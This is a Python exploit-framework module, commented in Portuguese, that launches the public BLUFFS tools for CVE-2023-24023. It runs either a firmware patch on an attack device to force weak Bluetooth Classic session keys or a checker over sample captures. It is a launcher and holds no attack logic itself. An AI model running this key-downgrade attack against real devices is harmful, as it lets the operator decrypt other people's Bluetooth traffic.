#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
"""Bridge subprocess para francozappa/bluffs (CVE-2023-24023).

Dispara ferramentas do repositório BLUFFS: patch de firmware no dispositivo de
ataque (``device/bluffs.py``, Python 2 + InternalBlue) ou análise LMP de
capturas de referência no ``checker`` (cenários LSC/SC documentados no paper).

O parâmetro ``target_address`` é contexto operacional (vítima / par); os
scripts upstream não recebem MAC por CLI.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
from pathlib import Path
from typing import List, Optional, Tuple

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Ponte subprocess para BLUFFS (forward/future secrecy, BR/EDR)."""

    __info__ = {
        "name": "BLUFFS Bridge",
        "description": (
            "Execução de utilitários BLUFFS (subprocess): CVE-2023-24023, ataques "
            "à forward/future secrecy em Bluetooth clássico. Inclui patch de firmware "
            "via InternalBlue (device/bluffs.py) e reprodução dos testes do checker "
            "com PCAPs de exemplo (LSC/SC). Requer clones e dependências do upstream."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Daniele Antonioli / BLUFFS contributors (upstream, subprocess)",
        ),
        "references": (
            "https://github.com/francozappa/bluffs",
            "https://nvd.nist.gov/vuln/detail/CVE-2023-24023",
        ),
        "devices": ("bluetooth", "br_edr", "internalblue"),
    }

    target_address = OptMAC(
        "",
        "MAC de contexto (vítima/par); não repassado ao upstream — apenas log operacional",
    )
    attack_mode = OptString(
        "session_key_downgrade",
        "Modo: session_key_downgrade | lsc_downgrade | sc_downgrade",
    )
    dry_run = OptBool(False, "Exibe o comando sem executar")

    def _candidate_repo_roots(self) -> List[Path]:
        """Possíveis raízes do clone ``bluffs``."""
        here = Path(__file__).resolve()
        return [
            here.parents[7] / "submodules" / "IoT" / "bluffs",
            here.parents[6] / "submodules" / "IoT" / "bluffs",
            here.parents[5] / "submodules" / "IoT" / "bluffs",
            here.parents[4] / "bluffs",
            here.parents[5] / "bluffs",
        ]

    def _repo_root(self) -> Optional[Path]:
        """Retorna diretório do clone se existir."""
        for p in self._candidate_repo_roots():
            if (p / "device" / "bluffs.py").is_file():
                return p.resolve()
        return None

    def _py2_argv_prefix(self) -> List[str]:
        """Prefixo argv para invocar Python 2 (InternalBlue / checker)."""
        for name in ("python2", "python2.7"):
            found = shutil.which(name)
            if found:
                return [found]
        py_launcher = shutil.which("py")
        if py_launcher:
            return [py_launcher, "-2"]
        return ["python2"]

    def _normalize_mode(self, raw: str) -> str:
        """Normaliza ``attack_mode``."""
        s = raw.strip().lower().replace("-", "_")
        if s in (
            "session_key_downgrade",
            "lsc_downgrade",
            "sc_downgrade",
        ):
            return s
        raise ValueError(
            "attack_mode deve ser session_key_downgrade | lsc_downgrade | sc_downgrade",
        )

    def _build_command(self, root: Path) -> Tuple[List[str], str]:
        """Monta comando e diretório de trabalho.

        Returns:
            Tupla (argv, cwd).

        Raises:
            FileNotFoundError: Script ausente.
            ValueError: Modo desconhecido.
        """
        mode = self._normalize_mode(str(self.attack_mode))
        prefix = self._py2_argv_prefix()

        if mode == "session_key_downgrade":
            script = root / "device" / "bluffs.py"
            if not script.is_file():
                raise FileNotFoundError("Ausente: {}".format(script))
            return prefix + [str(script)], str(script.parent)

        checker = root / "checker"
        if not checker.is_dir():
            raise FileNotFoundError("Diretório checker/ ausente em {}".format(root))

        if mode == "lsc_downgrade":
            inner = "import analyzer; analyzer.test_lsc_pixelbudsa()"
        else:
            inner = "import analyzer; analyzer.test_sc_pixelbudsa()"

        return prefix + ["-c", inner], str(checker)

    def run(self) -> None:
        """Executa BLUFFS conforme ``attack_mode``."""
        root = self._repo_root()
        if not root:
            logger.error(
                "Clone bluffs não encontrado. Esperado em submodules/IoT/bluffs "
                "ou caminho irmão ao WirelessXPL-Forge.",
            )
            return

        victim = str(self.target_address).strip()
        if victim:
            logger.info("Contexto target_address (não repassado ao upstream): %s", victim)
        else:
            logger.info("target_address vazio — apenas firmware/checker conforme modo.")

        try:
            cmd, cwd = self._build_command(root)
        except (FileNotFoundError, ValueError) as err:
            logger.error("%s", err)
            return

        cmd_str = " ".join(cmd)
        if self.dry_run:
            logger.info("DRY RUN — comando BLUFFS:")
            logger.info("%s", cmd_str)
            logger.info("cwd: %s", cwd)
            return

        logger.info("BLUFFS (%s): %s", str(self.attack_mode).strip(), cmd_str)
        logger.warning(
            "session_key_downgrade exige hardware compatível com InternalBlue e Python 2; "
            "lsc/sc_downgrade usam PCAPs de exemplo do repositório.",
        )

        env = os.environ.copy()
        env.setdefault("PYTHONUNBUFFERED", "1")

        try:
            subprocess.run(cmd, cwd=cwd, env=env, check=False)
        except KeyboardInterrupt:
            logger.info("Interrompido pelo usuário.")
        except Exception as exc:
            logger.error("Falha ao executar BLUFFS: %s", exc)
            logger.exception("bluffs_bridge")
